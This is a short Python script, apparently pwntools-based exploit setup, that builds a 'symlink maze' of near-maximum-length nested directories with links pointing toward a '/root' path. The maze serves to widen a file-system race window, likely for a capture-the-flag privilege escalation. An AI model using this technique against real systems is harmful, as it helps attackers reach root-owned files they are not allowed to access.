#!/bin/python

import os
import sys
import time
import shutil
import string
from pwn import * 

chars = list(string.printable)
chars.remove('.')
chars.remove('/')

try:
    shutil.rmtree('./maze')
except Exception as ex:
    print('Exception:: ' + str(ex))

os.mkdir('./maze')
os.chdir('./maze')
base_cwd   = os.getcwd()

ROOT_DIR = '/root'
MAX_SYMLINKS = 40
MAX_PATHLEN  = 4096 - 1 - len(ROOT_DIR) - len(base_cwd)

for link in range(MAX_SYMLINKS):
    chr = chars[link]
    print("Current char: " + str(chr))

    path = base_cwd + '/' + chr
    os.mkdir(path)

    for i in range(1, MAX_PATHLEN//2):
        path += '/' + chars[i % len(chars)]
        os.mkdir(path)
    
    os.symlink(base_cwd, path + '/root', target_is_directory=True)
    os.chdir(base_cwd)
    os.symlink(path, chr + '_end')
